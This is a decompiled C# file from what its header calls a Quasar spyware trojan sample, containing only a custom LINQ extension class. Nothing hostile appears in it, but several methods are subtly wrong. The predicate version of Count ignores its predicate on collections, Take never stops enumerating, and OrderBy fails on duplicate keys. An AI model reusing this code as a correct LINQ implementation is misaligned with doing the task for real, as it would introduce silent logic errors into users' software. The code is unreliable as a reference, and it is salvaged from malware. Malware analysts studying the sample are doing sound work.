// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.DTO.Linq.Linq
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using MailRy.Linq;
using NoiseMe.Drags.App.Models.Delegates;
using System;
using System.Collections;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.DTO.Linq
{
  public static class Linq
  {
    public static IEnumerable<TSource> OrderByDescending<TSource, TKey>(
      this IEnumerable<TSource> source,
      Func<TSource, TKey> getter)
      where TKey : IComparable<TKey>
    {
      List<TSource> sourceList = new List<TSource>();
      foreach (TSource source1 in source)
        sourceList.Add(source1);
      sourceList.Sort((IComparer<TSource>) new DelegateComparer<TSource, TKey>(getter));
      return (IEnumerable<TSource>) sourceList;
    }

    public static bool Any<TSource>(this IEnumerable<TSource> source, Func<TSource, bool> predicate)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (predicate == null)
        throw new ArgumentNullException(nameof (predicate));
      foreach (TSource source1 in source)
      {
        if (predicate(source1))
          return true;
      }
      return false;
    }

    public static bool Any<TSource>(this IEnumerable<TSource> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      using (IEnumerator<TSource> enumerator = source.GetEnumerator())
      {
        if (enumerator.MoveNext())
        {
          TSource current = enumerator.Current;
          return true;
        }
      }
      return false;
    }

    public static IEnumerable<TResult> Cast<TResult>(this IEnumerable source)
    {
      foreach (TResult result in source)
        yield return result;
    }

    public static bool Contains<TSource>(this IEnumerable<TSource> source, TSource value)
    {
      foreach (TSource source1 in source)
      {
        if (source1.Equals((object) value))
          return true;
      }
      return false;
    }

    public static int Count<TSource>(this IEnumerable<TSource> source)
    {
      switch (source)
      {
        case null:
          throw new ArgumentNullException(nameof (source));
        case ICollection<TSource> sources:
          return sources.Count;
        case ICollection collection:
          return collection.Count;
        default:
          int num = 0;
          foreach (TSource source1 in source)
            ++num;
          return num;
      }
    }

    public static IEnumerable<TSource> Take<TSource>(
      this IEnumerable<TSource> source,
      int count)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      int i = 0;
      foreach (TSource source1 in source)
      {
        if (i < count)
        {
          yield return source1;
          ++i;
        }
      }
    }

    public static int Count<TSource>(this IEnumerable<TSource> source, Func<TSource, bool> predic)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (predic == null)
        throw new ArgumentNullException(nameof (predic));
      switch (source)
      {
        case ICollection<TSource> sources:
          return sources.Count;
        case ICollection collection:
          return collection.Count;
        default:
          int num = 0;
          foreach (TSource source1 in source)
          {
            if (predic(source1))
              ++num;
          }
          return num;
      }
    }

    public static IEnumerable<TSource> Distinct<TSource>(this IEnumerable<TSource> source)
    {
      Hashtable set = new Hashtable();
      foreach (TSource key in source)
      {
        if (!set.ContainsKey((object) key))
        {
          set.Add((object) key, (object) null);
          yield return key;
        }
      }
    }

    public static TSource First<TSource>(this IEnumerable<TSource> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (source is IList<TSource> sourceList)
      {
        if (sourceList.Count > 0)
          return sourceList[0];
      }
      else
      {
        using (IEnumerator<TSource> enumerator = source.GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current;
        }
      }
      throw new InvalidOperationException("No elements");
    }

    public static TSource First<TSource>(
      this IEnumerable<TSource> source,
      Func<TSource, bool> predicate)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (predicate == null)
        throw new ArgumentNullException(nameof (predicate));
      foreach (TSource source1 in source)
      {
        if (predicate(source1))
          return source1;
      }
      throw new InvalidOperationException("No match");
    }

    public static TSource FirstOrDefault<TSource>(this IEnumerable<TSource> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (source is IList<TSource> sourceList)
      {
        if (sourceList.Count > 0)
          return sourceList[0];
      }
      else
      {
        using (IEnumerator<TSource> enumerator = source.GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current;
        }
      }
      return default (TSource);
    }

    public static TSource FirstOrDefault<TSource>(
      this IEnumerable<TSource> source,
      Func<TSource, bool> predicate)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (predicate == null)
        throw new ArgumentNullException(nameof (predicate));
      foreach (TSource source1 in source)
      {
        if (predicate(source1))
          return source1;
      }
      return default (TSource);
    }

    public static TSource Min<TSource>(this IEnumerable<TSource> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      Comparer<TSource> comparer = Comparer<TSource>.Default;
      TSource y = default (TSource);
      if ((object) y == null)
      {
        foreach (TSource x in source)
        {
          if ((object) x != null && ((object) y == null || comparer.Compare(x, y) < 0))
            y = x;
        }
        return y;
      }
      bool flag = false;
      foreach (TSource x in source)
      {
        if (flag)
        {
          if (comparer.Compare(x, y) < 0)
            y = x;
        }
        else
        {
          y = x;
          flag = true;
        }
      }
      if (flag)
        return y;
      throw new InvalidOperationException("No elements");
    }

    public static TSource Max<TSource>(this IEnumerable<TSource> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      Comparer<TSource> comparer = Comparer<TSource>.Default;
      TSource y = default (TSource);
      if ((object) y == null)
      {
        foreach (TSource x in source)
        {
          if ((object) x != null && ((object) y == null || comparer.Compare(x, y) > 0))
            y = x;
        }
        return y;
      }
      bool flag = false;
      foreach (TSource x in source)
      {
        if (flag)
        {
          if (comparer.Compare(x, y) > 0)
            y = x;
        }
        else
        {
          y = x;
          flag = true;
        }
      }
      if (flag)
        return y;
      throw new InvalidOperationException("No elements");
    }

    public static IEnumerable<TSource> OrderBy<TSource, TKey>(
      this IEnumerable<TSource> source,
      Func<TSource, TKey> keySelector)
    {
      SortedDictionary<TKey, TSource> sortedDictionary = new SortedDictionary<TKey, TSource>();
      foreach (TSource source1 in source)
        sortedDictionary.Add(keySelector(source1), source1);
      return (IEnumerable<TSource>) sortedDictionary.Values;
    }

    public static IEnumerable<TResult> Select<TSource, TResult>(
      this IEnumerable<TSource> source,
      Func<TSource, TResult> selector)
    {
      if (selector == null)
        throw new ArgumentNullException(nameof (selector));
      foreach (TSource source1 in source)
        yield return selector(source1);
    }

    public static TSource Single<TSource>(
      this IEnumerable<TSource> source,
      Func<TSource, bool> predicate)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (predicate == null)
        throw new ArgumentNullException(nameof (predicate));
      TSource source1 = default (TSource);
      long num = 0;
      foreach (TSource source2 in source)
      {
        if (predicate(source2))
        {
          source1 = source2;
          checked { ++num; }
        }
      }
      if (num == 0L)
        throw new InvalidOperationException("No matches");
      if (num != 1L)
        throw new InvalidOperationException("More than one match.");
      return source1;
    }

    public static int Sum(this IEnumerable<int> source)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      int num1 = 0;
      foreach (int num2 in source)
        checked { num1 += num2; }
      return num1;
    }

    public static int Sum<TSource>(this IEnumerable<TSource> source, Func<TSource, int> selector) => source.Select<TSource, int>(selector).Sum();

    public static TSource[] ToArray<TSource>(this IEnumerable<TSource> source) => source.ToList<TSource>().ToArray();

    public static Dictionary<TKey, TElement> ToDictionary<TSource, TKey, TElement>(
      this IEnumerable<TSource> source,
      Func<TSource, TKey> keySelector,
      Func<TSource, TElement> elementSelector,
      IEqualityComparer<TKey> comparer)
    {
      if (source == null)
        throw new ArgumentNullException(nameof (source));
      if (keySelector == null)
        throw new ArgumentNullException(nameof (keySelector));
      if (elementSelector == null)
        throw new ArgumentNullException(nameof (elementSelector));
      Dictionary<TKey, TElement> dictionary = new Dictionary<TKey, TElement>(comparer);
      foreach (TSource source1 in source)
        dictionary.Add(keySelector(source1), elementSelector(source1));
      return dictionary;
    }

    public static List<TSource> ToList<TSource>(this IEnumerable<TSource> source)
    {
      List<TSource> list = new List<TSource>();
      foreach (TSource source1 in source)
        list.Add(source1);
      return list;
    }

    public static IEnumerable<TSource> Where<TSource>(
      this IEnumerable<TSource> source,
      Func<TSource, bool> predicate)
    {
      if (predicate == null)
        throw new ArgumentNullException(nameof (predicate));
      foreach (TSource source1 in source)
      {
        if (predicate(source1))
          yield return source1;
      }
    }
  }
}
